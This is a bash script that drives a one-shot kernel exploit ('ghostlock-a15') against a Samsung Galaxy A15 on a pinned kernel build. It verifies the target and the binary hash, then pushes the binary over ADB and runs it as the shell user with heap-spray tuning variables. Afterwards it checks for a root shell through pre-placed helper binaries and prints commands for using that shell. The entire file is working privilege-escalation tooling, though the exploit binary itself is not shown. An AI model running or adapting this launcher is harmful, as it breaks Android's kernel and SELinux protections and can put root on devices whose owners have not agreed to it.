#!/usr/bin/env bash
# Run the one-shot A15 session-only exploit through an ADB shell.
# The exploit needs u:r:shell:s0; launching the binary directly from the
# caller's Android app shell would use a different UID/SELinux domain.
set -euo pipefail

readonly EXPECTED_MODEL='SM-A156U'
readonly EXPECTED_KERNEL='5.15.189-android13-8-33641424'
readonly EXPECTED_BINARY_SHA256='392b205b05c6eda39f4ecc401109859a38b7d585ff90912e85fdf5861a8a0617'
readonly REMOTE_DIR='/data/local/tmp/ghostlock-a15-session'
readonly REMOTE_BIN="$REMOTE_DIR/e"
readonly G4SH='/data/local/tmp/a/g4sh'
readonly G4D='/data/local/tmp/a/g4d'

usage() {
  cat <<'EOF'
Usage: adb-trigger.sh [path-to-candidate-ghostlock-a15-binary]

Requires adb to already list the Galaxy A15 as an online device. Set
ADB_SERIAL if more than one device is online. Set GHOSTLOCK_BIN instead of
passing the binary path if preferred.

The binary must match the pinned candidate SHA-256. This performs one kernel
exploit attempt, can panic/reboot the phone, and will not retry on the same
boot. It never reboots the phone itself.
EOF
}

if [[ "${1:-}" == '--help' || "${1:-}" == '-h' ]]; then
  usage
  exit 0
fi

SCRIPT_DIR="$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)"
BIN="${GHOSTLOCK_BIN:-${1:-$SCRIPT_DIR/../ghostlock-a15}}"
if [[ ! -f "$BIN" && -f "$HOME/storage/downloads/ghostlock-a15" ]]; then
  BIN="$HOME/storage/downloads/ghostlock-a15"
fi

ADB="${ADB:-adb}"
if ! command -v "$ADB" >/dev/null 2>&1; then
  printf 'adb is missing. Install Android platform-tools and connect the phone first.\n' >&2
  exit 1
fi
if ! "$ADB" version >/dev/null 2>&1; then
  printf 'adb is present but cannot start. Fix its runtime/package issue first.\n' >&2
  exit 1
fi
if [[ ! -f "$BIN" ]]; then
  printf 'Exploit binary not found: %s\n' "$BIN" >&2
  printf 'Pass its path or set GHOSTLOCK_BIN.\n' >&2
  exit 1
fi

local_hash="$(sha256sum "$BIN" | awk '{print $1}')"
if [[ "$local_hash" != "$EXPECTED_BINARY_SHA256" ]]; then
  printf 'Refusing unverified binary.\nExpected: %s\nFound:    %s\n' \
    "$EXPECTED_BINARY_SHA256" "$local_hash" >&2
  exit 1
fi

if [[ -n "${ADB_SERIAL:-}" ]]; then
  SERIAL="$ADB_SERIAL"
else
  mapfile -t ONLINE_DEVICES < <("$ADB" devices | awk 'NR > 1 && $2 == "device" {print $1}')
  if [[ "${#ONLINE_DEVICES[@]}" -ne 1 ]]; then
    printf 'Expected exactly one online ADB device; found %d.\n' \
      "${#ONLINE_DEVICES[@]}" >&2
    printf 'Connect/pair the phone, or set ADB_SERIAL explicitly.\n' >&2
    "$ADB" devices -l >&2 || true
    exit 1
  fi
  SERIAL="${ONLINE_DEVICES[0]}"
fi

remote() {
  "$ADB" -s "$SERIAL" shell "$1"
}

print_g4sh_command() {
  printf 'To verify root later this boot, run:\n'
  printf "  adb -s '%s' shell '%s -c \"id\"'\n" "$SERIAL" "$G4SH"
}

print_fish_command() {
  printf 'To open an interactive root shell later this boot, run:\n'
  printf "  adb -s '%s' shell -t 'TERM=xterm-256color TERMINFO=/data/data/com.termux/files/usr/share/terminfo %s'\n" \
    "$SERIAL" "$G4SH"
  printf 'At the g4sh prompt, start fish with:\n'
  printf '  . /data/local/tmp/a/g4run-init.sh\n'
  printf '  g4run fish\n'
}

g4sh_root_uid() {
  local response
  response="$(remote "$G4SH -c 'id -u'" 2>/dev/null || true)"
  printf '%s\n' "$response" | tr -d '\r' | awk '
    /^[[:space:]]*0[[:space:]]*$/ { found = 1 }
    END { if (found) print "0" }
  '
}

STAGED=0
cleanup_remote_stage() {
  if [[ "$STAGED" == '1' ]]; then
    remote "rm -f '$REMOTE_BIN'; rmdir '$REMOTE_DIR' 2>/dev/null || true" \
      >/dev/null 2>&1 || true
  fi
}

MODEL="$(remote 'getprop ro.product.model' | tr -d '\r')"
KERNEL="$(remote 'uname -r' | tr -d '\r')"
BOOT_COMPLETE="$(remote 'getprop sys.boot_completed' | tr -d '\r')"
BOOT_ID="$(remote 'cat /proc/sys/kernel/random/boot_id' | tr -d '\r')"
ENFORCING="$(remote 'getenforce' | tr -d '\r')"
SHELL_UID="$(remote 'id -u' | tr -d '\r')"
SHELL_CONTEXT="$(remote 'id -Z' | tr -d '\r')"

if [[ "$MODEL" != "$EXPECTED_MODEL" || "$KERNEL" != "$EXPECTED_KERNEL" ]]; then
  printf 'Wrong target. Expected %s / %s; found %s / %s.\n' \
    "$EXPECTED_MODEL" "$EXPECTED_KERNEL" "$MODEL" "$KERNEL" >&2
  exit 1
fi
if [[ "$BOOT_COMPLETE" != '1' || "$ENFORCING" != 'Enforcing' || \
      "$SHELL_UID" != '2000' || "$SHELL_CONTEXT" != 'u:r:shell:s0' ]]; then
  printf 'Target is not in the expected clean ADB-shell state.\n' >&2
  printf 'boot_completed=%s SELinux=%s uid=%s context=%s\n' \
    "$BOOT_COMPLETE" "$ENFORCING" "$SHELL_UID" "$SHELL_CONTEXT" >&2
  exit 1
fi

ROOT_UID="$(g4sh_root_uid)"
if [[ "$ROOT_UID" == '0' ]]; then
  printf 'This boot already has the root session. Refusing to trigger again.\n'
  remote "$G4SH -c 'id'" || true
  print_g4sh_command
  print_fish_command
  exit 0
fi
if ! remote "test -x '$G4SH' && test -x '$G4D'" >/dev/null 2>&1; then
  printf 'Required pre-existing g4d/g4sh files are missing or not executable.\n' >&2
  exit 1
fi

STATE_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/ghostlock-a15"
mkdir -p "$STATE_DIR"
MARKER="$STATE_DIR/$BOOT_ID.triggered"
if [[ -e "$MARKER" ]]; then
  printf 'This boot ID was already attempted: %s\n' "$BOOT_ID" >&2
  printf 'Refusing a second MCAST/PI trigger on the same boot.\n' >&2
  exit 1
fi

printf 'Target: %s (%s)\nKernel: %s\nBoot ID: %s\n' \
  "$MODEL" "$SERIAL" "$KERNEL" "$BOOT_ID"
printf 'Binary SHA-256: %s\n' "$local_hash"
printf 'This is a one-shot kernel exploit attempt and may panic/reboot the phone.\n'
printf 'Type TRIGGER to continue: '
read -r CONFIRM
if [[ "$CONFIRM" != 'TRIGGER' ]]; then
  printf 'Cancelled.\n'
  exit 0
fi

STALE_STAGE=0
if remote "test -e '$REMOTE_BIN'" >/dev/null 2>&1; then
  REMOTE_STAGED_HASH="$(remote "sha256sum '$REMOTE_BIN' 2>/dev/null" | awk '{print $1}' | tr -d '\r' || true)"
  if [[ "$REMOTE_STAGED_HASH" != "$EXPECTED_BINARY_SHA256" ]]; then
    printf 'Refusing to remove an unexpected staged file: %s\n' "$REMOTE_BIN" >&2
    printf 'Expected hash %s; found %s\n' \
      "$EXPECTED_BINARY_SHA256" "${REMOTE_STAGED_HASH:-<unreadable>}" >&2
    exit 1
  fi
  STALE_STAGE=1
fi

STAGED=1
trap cleanup_remote_stage EXIT
if [[ "$STALE_STAGE" == '1' ]]; then
  printf 'Removing stale staged candidate from this unattempted boot: %s\n' \
    "$REMOTE_BIN"
  remote "rm -f '$REMOTE_BIN'"
  if remote "test -e '$REMOTE_BIN'" >/dev/null 2>&1; then
    printf 'Could not remove the stale staged candidate; refusing to continue.\n' >&2
    exit 1
  fi
fi
remote "mkdir -p '$REMOTE_DIR'"
"$ADB" -s "$SERIAL" push "$BIN" "$REMOTE_BIN"
remote "chmod 0755 '$REMOTE_BIN'"

VERIFY_FILE="$(mktemp)"
trap 'rm -f "$VERIFY_FILE"; cleanup_remote_stage' EXIT
"$ADB" -s "$SERIAL" pull "$REMOTE_BIN" "$VERIFY_FILE" >/dev/null
remote_hash="$(sha256sum "$VERIFY_FILE" | awk '{print $1}')"
rm -f "$VERIFY_FILE"
trap cleanup_remote_stage EXIT
if [[ "$remote_hash" != "$EXPECTED_BINARY_SHA256" ]]; then
  printf 'Device copy hash mismatch; refusing to execute. Found %s\n' \
    "$remote_hash" >&2
  exit 1
fi

# Create the per-boot marker immediately before the trigger. A lost ADB
# connection or crash must not lead to an automatic same-boot retry.
if ! (set -o noclobber; printf '%s\n' "$BOOT_ID" > "$MARKER") 2>/dev/null; then
  printf 'Could not create the one-attempt-per-boot marker; refusing.\n' >&2
  exit 1
fi

printf 'Launching the one-shot trigger now. The script will not reboot or retry.\n'
set +e
remote "SLIDE_USE_TRACEFS=1 A15_MCAST_FOPS_ROUTE=1 A15_SESSION_ONLY=1 A15_MCAST_PRESPRAY_SENDS=144 A15_MCAST_RECLAIM_SENDS=16 '$REMOTE_BIN'"
RUN_STATUS=$?
set -e

printf '\nChecking the root session through g4sh...\n'
ROOT_UID="$(g4sh_root_uid)"
if [[ "$ROOT_UID" == '0' ]]; then
  remote "$G4SH -c 'id'"
  printf 'One-boot root session verified.\n'
  print_g4sh_command
  print_fish_command
  exit 0
fi

printf 'Root was not verified (exploit/ADB status %s). Do not retry this boot.\n' \
  "$RUN_STATUS" >&2
printf 'Keep the transcript and collect device logs before deciding what to do next.\n' >&2
exit 1
